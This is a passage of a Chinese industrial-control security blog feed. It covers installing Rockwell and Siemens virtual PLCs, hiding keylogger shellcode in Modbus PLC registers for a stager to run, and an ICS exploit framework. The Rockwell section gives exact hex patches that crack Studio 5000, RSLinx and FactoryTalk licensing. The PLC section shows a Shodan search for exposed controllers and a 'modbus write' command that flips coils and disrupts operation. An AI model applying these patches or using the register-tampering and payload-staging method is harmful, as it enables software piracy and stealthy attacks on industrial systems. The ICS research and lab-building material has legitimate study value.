+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/17.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、“User Name”、“Company Name”和“Serial Number”与安装Studio5000中的相同。然后点击“Next”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/18.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、出现下面的对话框，表示是否创建“SoftLogix”的桌面快捷方式。根据个人爱好选择。本文选择“是”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/19.png" /&gt;&lt;/p&gt;
+&lt;p&gt;6、完成后，点击“Finish”，然后点击“EXIT”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/20.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;五、软件破解&lt;/h2&gt;
+&lt;p&gt;要点：因为软件在运行，部分文件不让修改，建议在重启虚拟机，启动时按F8，进入“安全模式”，将文件复制到物理计算机后修改，然后用修改后的文件替换原来的文件。&lt;/p&gt;
+&lt;p&gt;1、在C:\Program Files\Common Files\Rockwell目录下找到“FTACommon.dll”文件。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/21.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、复制到物理机，用“UltraEdit”或其他相似的软件打开。在位置40FB9处，用“30 90”替换“34 02”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/22.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、替换完成后，保存，然后将修改后的文件，复制到虚拟机原来的目录下，替换原文件。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/23.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、同样的方法修改替换以下文件。
+（1）、C:\Program Files\Rockwell Software\FactoryTalk Activation\flexsvr.exe，位置E4D0，用“33 C0 40 89 45 FC 48 C3”替换“55 8B EC 83 E4 F8 81 EC”。
+（2）、C:\Program Files\Rockwell Software\Studio 5000\Launcher\ActivationInterop.dll，位置5C86，用“E9 2C 00 00 00 90”替换“0F 85 46 03 00 00”。
+（3）、C:\Program Files\Rockwell Software\Studio 5000\Launcher\ftastub.dll，位置FCD，用“09 00”替换“40 03”。
+（4）、C:\Program Files\Rockwell Software\Studio 5000\Logix Designer\CHS\v21\Bin\LogixDesigner.exe，位置1DFB36，用“E9 2C 00 00 00 90”替换“0F 85 46 03 00 00”。
+（5）、C:\Program Files\Rockwell Software\Studio 5000\Logix Designer\CHS\v21\Bin\ftastub.dll，位置FCD，用“09 00”替换“40 03”。
+（6）、C:\Program Files\Rockwell Software\RSLinx\RSLINX.EXE，位置D9092，用“E9 2C 00 00 00 90”替换“0F 85 44 03 00 00”。
+（7）、C:\Program Files\Rockwell Software\RSLinx\ftastub.dll，位置FCD，用“09 00”替换“40 03”。&lt;/p&gt;
+&lt;p&gt;5、破解完成后，重启计算机。进入系统后，会发现SoftLogix 5800自动启动。并出现下面的窗口，这是因为不是正版的原因。点击确定即可，不影响正常使用。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/24.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;五、连接演示&lt;/h2&gt;
+&lt;p&gt;以下测试用了2台电脑，运行SoftLogix5800的计算机叫A，编程的计算机叫B。
+1、配置计算机IP&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/26.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、启动SoftLogix的RSLinx。右键单击0槽，在弹出的菜单中单击“Start RSLinx”。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/27.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、添加CPU模块。右键单击1槽，然后单击“Create”。选择“1789……”，然后一直“Next”，直至完成。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/28.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、同样的方法，添加以太网模块。注意，选择刚才配置的那个IP地址。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/29.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、同样的方法，添加2个信号模块。
+6、完成后如下&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/30.png" /&gt;&lt;/p&gt;
+&lt;p&gt;7、打开电脑B的RSLinx，添加以太网驱动。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/31.png" /&gt;&lt;/p&gt;
+&lt;p&gt;8、完成后，RSLinx自动扫描，一段时间后可以扫描到SoftLogix5800.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/32.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/33.png" /&gt;&lt;/p&gt;
+&lt;p&gt;9、studio5000中连接SoftLogix。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/35.png" /&gt;&lt;/p&gt;
+&lt;p&gt;10、编程下载&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/36.png" /&gt;&lt;/p&gt;
+&lt;p&gt;11、连接演示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/AB_VPLC/37.png" /&gt;&lt;/p&gt;
+&lt;p&gt;至此虚拟机下安装使用软PLC Softlogix5800已经完成。如果想了解更多信息请参考《1789-IN001K-EN-P》和《1789UM002J-EN-P》。&lt;/p&gt;
+&lt;h2&gt;六、结束语&lt;/h2&gt;
+&lt;p&gt;（1）软件破解方法来自网络，破解方法版权归发帖人所有。想了解更多信息请参考：http://bbs.e10000.cn/a/a.asp?B=305&amp;amp;ID=1352006。
+（2）本文仅用于研究学习，使用过程中出现任何问题，盖不负责。如用于商业用途，请购买正版软件。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">feilt</dc:creator><pubDate>Mon, 11 Sep 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-09-11:tool/AB_VPLC.html</guid><category>虚拟PLC</category><category>软PLC</category></item><item><title>构建虚拟工控环境系列 - 西门子虚拟PLC</title><link>http://icsmaster.com/tool/WinAC_RTX.html</link><description>&lt;h2&gt;一、    概述&lt;/h2&gt;
+&lt;p&gt;跟随着工控安全一路走来，工控安全市场今年明显有相当大的改善，无论从政策还是客户需求，都在逐步扩大中。但是，搞工控安全研究的人员却寥寥无几。一方面工控安全是个跨学课的技术，需要了解多方面的知识，有比较高的技术上的门槛；另一方面，没有可以研究和学习的便利的环境。一般，搞这方面研究的公司或者个人，都会先购买一些硬件设备，搭建一个模拟环境，再做相应的安全研究，成本实在是太高。为了解决这个问题，我们做了一系列的相关的技术研究，通过构建一套虚拟的工业控制环境，从而降低了解和学习工控安全的门槛，推动相关人才的培养。&lt;/p&gt;
+&lt;p&gt;本篇主要介绍西门子虚拟PLC，使用的操作系统为Windows7 x86 Ultimate，虚拟化软件为 VMware Workstation 12 Pro，（SIEMENS）WinAC RTX 2010。&lt;/p&gt;
+&lt;h2&gt;二、    控制器虚拟化技术介绍&lt;/h2&gt;
+&lt;p&gt;可编程控制器，即PLC。PLC的实现分为硬PLC和软PLC。 所谓硬PLC从严格意义上来说是由硬件或者一块专用的ASIC芯片来实现PLC指令的执行．而软PLC是用一些通用的CPU或者MCU来实现PLC指令的解释或者编译持行。&lt;/p&gt;
+&lt;p&gt;软件PLC（SoftPLC，也称为软逻辑SoftLogic）是一种基于基于PC机开发结构的控制系统，它具有硬PLC在功能、可靠性、速度、故障查找等方面的特点，利用软件技术可以将标准的工业PC转换成全功能的PLC过程控制器。软件PLC综合了计算机和PLC的开关量控制、模拟量控制、数学运算、数值处理、网络通信、PID调节等功能，通过一个多任务控制内核，提供强大的指令集、快速而准确的扫描周期、可靠的操作和可连接各种I/O系统的及网络的开放式结构。所以，软件PLC 提供了与硬PLC同样的功能，同时又提供了PC环境的各种优点。&lt;/p&gt;
+&lt;p&gt;虚拟机技术是虚拟化技术的一种，所谓虚拟化技术就是将事物从一种形式转变成另一种形式，最常用的虚拟化技术有操作系统中内存的虚拟化，实际运行时用户需要的内存空间可能远远大于物理机器的内存大小，利用内存的虚拟化技术，用户可以将一部分硬盘虚拟化为内存，而这对用户是透明的。又如，可以利用虚拟专用网技术（VPN）在公共网络中虚拟化一条安全，稳定的“隧道”，用户感觉像是使用私有网络一样。&lt;/p&gt;
+&lt;p&gt;如果将软PLC安装在虚拟机下，在软PLC出现故障时，用备份的虚拟机代替当前的虚拟机，即可快速恢复系统运行；此外，开发人员不必在现场，即可开发调试项目，在调试完成后，将包含软PLC的虚拟机直接放在现场的工控计算机上就直接可以完全运行。但是软PLC目前只能在物理PC上安装运行，在虚拟机下可以安装，但不能运行，这是由于软PLC需要直接驱动硬件，而虚拟机中的硬件都是虚拟造成的。&lt;/p&gt;
+&lt;h2&gt;三、西门子虚拟化WinAC产品分类&lt;/h2&gt;
+&lt;p&gt;SIMATIC WinAC是西门子公司开发的基于PC控制的核心组件，它的出现扩展了SIMATIC S7的控制范围。WinAC是一个名副其实的控制中心，它将PLC控制、数据处理、通讯、可视化及工艺集成于一台PC机上。 SIMATIC WinAC产品包括软件型和插槽型两大类，包括如下5种产品： &lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;1、WinAC Basis (WinAC 基本型) 
+WinAC Basis 是低成本解决方案，用于对控制无精确时间要求，有大量、快速的数据处理与控制任务(控制任务指PLC的控制功能)相结合或其它PC任务的控制场合。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;2、WinAC PN 
+第一个支持PROFInet通讯标准的SIMATIC CPU，性能与WinAC Basis相似。WinAC PN支持基于组件的自动化(CBA)和PROFInet通讯标准。基于组件的自动化和PROFInet提供了一个开放的标准，用于在复杂任务中机械和系统单元之间的数据交换。数据交换通过SIMATIC iMap工具来进行配置。WinAC PN适应于以下任务：
+整个复杂系统的机械和车间区域之间的协调和连接 来自系统单元或机械可被集成到一个全范围的复杂系统控制WinAC Basis 4.1有一个选件WinAC PN，带有WinAC PN选件的WinAC Basis 4.1支持PROFInet和CBA。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;3、WinAC RTX(WinAC 实时型) 
+WinAC RTX 提供了Windows 2000/XP的实时子系统，具有“硬实时”和“抗死机”特性。适应于具有高速和精确时间要求的控制任务的场合，如运动控制、闭环控制等。 &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;4、WinAC MP 
+WinAC MP基于WinCE操作系统和SIMATIC MP370(一种多功能面板)硬件平台。MP370为无硬盘、无风扇设计，WinCE具有实时特性，可实现严格的确定性动作。WinAC MP用在恶劣工业环境和有大量数据要处理的场合。 &lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;5、WinAC Slot 412/416 
+以板卡的形式插入在PC中，在板卡上已经集成了用于控制任务的CPU、存储器等元件。它可独立于PC进行控制操作。板卡上集成一个MPI/DP接口和一个DP口。WinAC Slot适用于对安全性和稳定性要求较高的场合。WinAC Slot 412/416在性能上与S7-412/416相近。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;四、虚拟控制器WinAC RTX搭建&lt;/h2&gt;
+&lt;p&gt;1、打开虚拟机系统的安装目录，找到后缀名是“.vmx”的文件，然后用记事本打开。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、添加虚拟网卡设备，添加如下配置。如果配置文件中已存在，则不添加“ethernet0.virtualDev = "e1000e"”，直接将等号后面的值改为"e1000e"。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;ethernet0.virtualDev = &amp;quot;e1000e&amp;quot;
+bios440.filename=&amp;quot;FUJITSU211_314.ROM&amp;quot;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/2.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、在西门子技术支持的官网（&lt;a href="https://support.industry.siemens.com"&gt;https://support.industry.siemens.com&lt;/a&gt;）下载文件“FUJITSU211_314.ROM”，并将在虚拟机安装目录下。此文件是将虚拟机硬件映像成FUJITSU PRIMERGR服务器。如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/3.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、打开运行虚拟机，配置当前主机的IP地址。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/6.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、使用虚拟光驱安装WinAC RTX 2010。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;6、安装完后启动station Configurator。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/5.png" /&gt;&lt;/p&gt;
+&lt;p&gt;7、打开的窗口中添加WinLC RTX，添加通讯网卡“IE 通用”&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/7.png" /&gt;&lt;/p&gt;
+&lt;p&gt;8、此时会发现桌面上多出一个图标，此图标就是虚拟PLC的图标，双击打开即可。至此，就完成了在虚拟机中安装PLC。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/8.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;五、虚拟控制器组态&lt;/h2&gt;
+&lt;p&gt;1、打开step7软件，创建工程，并进行组态配置，配置方法如下图所示。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/9.png" /&gt;&lt;/p&gt;
+&lt;p&gt;2、编写一个小的测试程序。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/10.png" /&gt;&lt;/p&gt;
+&lt;p&gt;3、编译并下载组态程序。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/11.png" /&gt;&lt;/p&gt;
+&lt;p&gt;4、监控运行，如果一切正常，即显示为“RUN”状态。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/12.png" /&gt;&lt;/p&gt;
+&lt;p&gt;5、可以使用step7软件控制虚拟PLC的启停。&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/WinAC_RTX/13.png" /&gt;&lt;/p&gt;
+&lt;p&gt;至此，就完成了虚拟PLC的搭建。&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">feilt</dc:creator><pubDate>Sun, 30 Jul 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-07-30:tool/WinAC_RTX.html</guid><category>虚拟PLC</category><category>软PLC</category></item><item><title>利用Modbus PLC作为攻击载荷分发系统</title><link>http://icsmaster.com/security/plcinjecter.html</link><description>&lt;h2&gt;一、    介绍&lt;/h2&gt;
+&lt;p&gt;随着互联网+、工业4.0的推进，以前的网络边界被逐渐打破，工业控制系统的安全问题越来越突出，近期针对控制器的攻击层出不穷，如 &lt;a href="http://icsmaster.com/news/logicblob.html"&gt;PLC逻辑炸弹&lt;/a&gt;、&lt;a href="http://icsmaster.com/security/ClearEnergy.html"&gt;PLC勒索软件&lt;/a&gt;，&lt;a href="http://icsmaster.com/security/plcblaster.html"&gt;PLC蠕虫&lt;/a&gt;，相关的技术我们一直在跟踪分析。&lt;/p&gt;
+&lt;p&gt;本文主要介绍怎么利用Modbus PLC作为攻击载荷，将恶意代码隐藏在控制器(programmable logic controllers)中，从而躲避当前的主流的网络攻击检测，提高攻击的隐蔽性，使得网络攻击难发现以及难溯源。下文中主要使用是施耐德电气的控制器TM221，该设备使用的主要的通信协议是Modbus Tcp，被中小型制造工厂广泛使用，以实现制造工艺的自动化。由于Modbus Tcp协议存在多个安全问题，利用Modbus Tcp协议可以实现任意上传和下载内存数据，因此，可以将攻击载荷上传至PLC内存中，从而躲避常规的安全检测。&lt;/p&gt;
+&lt;h2&gt;二、    利用modbus-cli操作plc寄存器&lt;/h2&gt;
+&lt;p&gt;本文中我们使用的控制器，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/2.png" /&gt;&lt;/p&gt;
+&lt;p&gt;使用关键字“TM221ME16R”，在Shodan可以查询到当前暴露在互联网上的施耐德电气，如下图所示。&lt;strong&gt;注意：本文仅做技术研究，相关工具请务在真实工业环境中使用，否则后果自负。&lt;/strong&gt; &lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/1.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Modbus-cli是一个命令行（cli）工具，使用此工具可以对PLC 寄存器进行读写操作，使用方法如下图所示：&lt;/p&gt;
+&lt;p&gt;运行指令参数：modbus [OPTIONS] SUBCOMMAND [ARG]&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/3.png" /&gt;&lt;/p&gt;
+&lt;p&gt;我们至少有两种方法获取寄存器地址里面的值，分别为：Schneider address和Modicon addess。 如下表所示，Modicon addess从地址前的％M开始。&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;Data type&lt;/th&gt;
+&lt;th&gt;Data size&lt;/th&gt;
+&lt;th&gt;Schneider address&lt;/th&gt;
+&lt;th&gt;Modicon addess&lt;/th&gt;
+&lt;th&gt;Parameter&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Word&lt;/td&gt;
+&lt;td&gt;16 bits&lt;/td&gt;
+&lt;td&gt;%MW100&lt;/td&gt;
+&lt;td&gt;400101&lt;/td&gt;
+&lt;td&gt;--word&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Interger&lt;/td&gt;
+&lt;td&gt;16 bits&lt;/td&gt;
+&lt;td&gt;%MW100&lt;/td&gt;
+&lt;td&gt;400101&lt;/td&gt;
+&lt;td&gt;--int&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Floating point&lt;/td&gt;
+&lt;td&gt;32 bits&lt;/td&gt;
+&lt;td&gt;%MF100&lt;/td&gt;
+&lt;td&gt;400101&lt;/td&gt;
+&lt;td&gt;--float&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Double word&lt;/td&gt;
+&lt;td&gt;32 bits&lt;/td&gt;
+&lt;td&gt;%MD100&lt;/td&gt;
+&lt;td&gt;400101&lt;/td&gt;
+&lt;td&gt;--word&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;Boolean(coils)&lt;/td&gt;
+&lt;td&gt;1 bits&lt;/td&gt;
+&lt;td&gt;%M100&lt;/td&gt;
+&lt;td&gt;101&lt;/td&gt;
+&lt;td&gt;N/A&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;modbus read &lt;IP&gt; %MW100 10，意思是读取以%MW100开头的十个值；我们可以通过modbus-cli从plc中读取指定的寄存器中的值，执行如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/4.png" /&gt;&lt;/p&gt;
+&lt;p&gt;为了达到相同的效果，也可以换种形式来获取，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/5.png" /&gt;&lt;/p&gt;
+&lt;p&gt;读取线圈（coils）的值，命令如下&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;modbus read 192.168.1.31 %M100 10
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;可以看出线圈全都处于关闭状态，如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/6.png" /&gt;&lt;/p&gt;
+&lt;p&gt;modbus-cli不仅可以读取plc寄存器数据还可以更改，如若被不法份子利用直接可以更改里面的状态值，命令如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;modbus write 192.168.1.31 %M100 1 1 1 1 1 1 1 1 1 1
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;执行结果如下图所示&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/7.png" /&gt;&lt;/p&gt;
+&lt;p&gt;修改PLC寄存器的值时，可能会导致上位机和终端设备的异常运行，下图所示是执行前后&lt;/p&gt;
+&lt;p&gt;正常运行状态如下图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/8.png" /&gt;&lt;/p&gt;
+&lt;p&gt;修改寄存器后组态界面出现异常&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/9.gif" /&gt;&lt;/p&gt;
+&lt;h2&gt;三、    利用ISF攻击框架进行PLC注入&lt;/h2&gt;
+&lt;p&gt;利用plc存储payload/shellcode优势：
+由于payload存放在PLC的内存中，所以加大了取证分析的难度。此外，一旦payload被取出，其内容直接被写入内存，这样也加大了取证难度。
+此外，我认为Modbus Stager在某些ICS环境中也是非常有用的，因为这些环境下Modbus之外的协议会引起人们的警觉，并且WinHTTP / WinInet stager也不是最适用的。所以，在这种情况下，只需要一个和modbus处理器（stager），读取plc里面的数据并执行。
+攻击流程如下：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/10.png" /&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;attacker将payload/shellcode上传至modbus plc，如果没设定上传得初始地址，那么就从x00开始，在这里其实也可以使用其他工具或者交互脚本，如实验一里面的modbus-cli。攻击者一般会选择第三方的plc，因为第三方的plc具有良好的匿名性质，跟踪难度较大，无须将payload上传至服务器。&lt;/li&gt;
+&lt;li&gt;attacker 利用其他方式漏洞或钓鱼等将stager传入工控环境的windows机器并触发运行。&lt;/li&gt;
+&lt;li&gt;stager运行之后会与modbus plc数据交互，读取plc保持寄存器里面的payload/shellcode并执行。stager是由汇编编译主要功能是和modbus plc建立socket通信接收payload并在内存执行，总共大小只有1KB，难以被沙软检测，更何况是安全相对薄弱的工控环境。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;Payload 生成：
+Payload是“Functional Keylogger to File Null-Free Shellcode” 长度为0x0259，在生成的时候前四个字节代表shellcode的长度，如图2-2-2所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/11.png" /&gt;&lt;/p&gt;
+&lt;p&gt;为了将payload上传至plc中，plcInjectPayload会根据加载的控制策略不同，对plc的可用内存大小的要求也有所变化，因此该脚本首先检查它们是否有足够的内存空间来存放相应的payload。为了检测内存的大小，可以发送操作功能代码为03（读取保持寄存器）的Modbus请求，尝试从某个地址读取特定记录（每个记录长度为16比特）。如果收到一个0x83异常，那么说明这个PLC对于我们来说是无法使用的。&lt;/p&gt;
+&lt;p&gt;Modbus 协议的功能代码如下图所示&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/13.png" /&gt;&lt;/p&gt;
+&lt;p&gt;使用ISF下载控制器寄存器，执行操作如下&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/12.gif" /&gt;&lt;/p&gt;
+&lt;p&gt;读取到的内容如下图所示&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/14.png" /&gt;&lt;/p&gt;
+&lt;p&gt;上传payload至plc，在本次实验没有指定地址，就从0x00开始上传。上传之后的结果如图所示：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/15.png" /&gt;&lt;/p&gt;
+&lt;p&gt;执行stager 获取plc保持寄存器里面payload加载至内存，并执行：&lt;/p&gt;
+&lt;p&gt;Stager入口点：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/16.png" /&gt;&lt;/p&gt;
+&lt;p&gt;Socket连接，对应的连接数据如下
+  0x1F01A8C0 -&amp;gt; 192.168.1.31 
+  0xF6010002 -&amp;gt; port :502&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/17.png" /&gt;&lt;/p&gt;
+&lt;p&gt;接收0x259个字节：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/18.png" /&gt;&lt;/p&gt;
+&lt;p&gt;该stager分三次接收数据：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/19.png" /&gt;&lt;/p&gt;
+&lt;p&gt;接收的payload写入内存并执行：&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Alt text" src="/static/images/plcinjector/20.png" /&gt;&lt;/p&gt;
+&lt;h2&gt;四、参考&lt;/h2&gt;
+&lt;p&gt;[1] Modbus Stager: Using PLCs as a payload/shellcode distribution system  &lt;a href="http://www.shelliscoming.com/2016/12/modbus-stager-using-plcs-as.html"&gt;链接&lt;/a&gt;
+[2] Functional Keylogger &lt;a href="https://www.exploit-db.com/exploits/39794/"&gt;链接&lt;/a&gt;
+[4] ISF攻击框架 &lt;a href="https://github.com/w3h/isf"&gt;链接&lt;/a&gt;&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">chansim</dc:creator><pubDate>Tue, 18 Jul 2017 14:36:00 +0800</pubDate><guid>tag:icsmaster.com,2017-07-18:security/plcinjecter.html</guid><category>工控技术</category><category>PLC注入</category></item><item><title>工控漏洞利用框架 - ISF(Industrial Security Framework)</title><link>http://icsmaster.com/tool/isf.html</link><description>&lt;h2&gt;一、    框架介绍&lt;/h2&gt;
+&lt;p&gt;本框架主要使用Python语言开发，通过集成ShadowBroker释放的NSA工具Fuzzbunch攻击框架，开发一款适合工控漏洞利用的框架。由于Fuzzbunch攻击框架仅适用于Python2.6，很多核心的功能都封装成了DLL，通过函数进行调用，不便于后期的移植和使用。但是，Fuzzbunch的命令行使用的确很方便，而且够傻瓜，所以就有集成一个适合工控漏洞利用的框架想法。新框架对主要的接口使用Python重新实现，所以支持Python2.X版本。&lt;/p&gt;
+&lt;p&gt;肯定会有人问，有牛逼的MSF，搞这个玩竟儿有什么用？主要基于如下几点考虑&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;MSF命令行使用不够傻瓜，纯属个人观点，仅供参考。&lt;/li&gt;
+&lt;li&gt;工控的很多私用协议都使用Python开发，有很多优秀的Python框架（如scapy、kitty），集成在MSF很麻烦，有一个Python的框架会方便很多。&lt;/li&gt;
+&lt;li&gt;最主要的一个原因是，从事工控安全以来，本人一直在使用Python，很多脚本都是基于Python开发的，想将手上所有的资源进行整合，提供一个统一的平台，方便。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;二、    框架使用&lt;/h2&gt;
+&lt;p&gt;进入目录，执行如下命令：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;python main.py
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;界面显示如下：&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;D:\isf\isf&amp;gt;python main.py
+
+                               ???
+                         ???????????????
+                      ?????           ?????
+                   ????                   ????
+                 ????                       ????
+                ???                           ???
+               ???             ??              ???
+              ???           ????????            ???
+             ???           ???????????           ???
+             ???          ?????????????          ???
+             ??          ???????????????          ??
+             ??         ?????????????????         ??
+             ??        ??????       ?????         ??
+             ??            ???????????            ??
+             ??            ???????????            ??
+             ??             ?????????             ??
+             ???             ???????             ???
+             ???              ?????              ???
+              ???          ???????????          ???
+               ???      ?????????????????      ???
+                ???   ????????????????????    ???
+                  ?????????????????????????????
+                   ???????????????????????????
+                      ?????????????????????
+                         ---ICSMASTER---
+
++ - - - - - + [ Version 1.1.1                           ] + - - - - - +
++ - - - - - + [ MADE BY ICSMASTER. HTTP://ICSMASTER.COM ] + - - - - - +
+
+[*] Loading Plugins
+[*] Initializing isf v1.1.1
+[*] Adding Global Variables
+[+] Set ResourcesDir =&amp;gt;. c:\isf\Resources
+[+] Set Color =&amp;gt;. True
+[+] Set ShowHiddenParameters =&amp;gt;. False
+[+] Set NetworkTimeout =&amp;gt;. 60
+[+] Set LogDir =&amp;gt;. D:\isf\isf\logs
+[*] Autorun ON
+
+Exploit Autorun List
+====================
+
+  0) apply
+  1) touch all
+  2) prompt confirm
+  3) execute
+
+
+Payload Autorun List
+====================
+
+  0) apply
+  1) prompt confirm
+  2) execute
+
+
+[+] Set ISFStorage =&amp;gt;. D:\isf\isf\storage
+isf &amp;gt;
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;show命令使用，显示当前所有的插件，如下所示&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;isf &amp;gt; show
+
+Plugin Categories
+=================
+
+  Category     Active Plugin
+  --------     -------------
+  Exploit      None
+  Payload      None
+
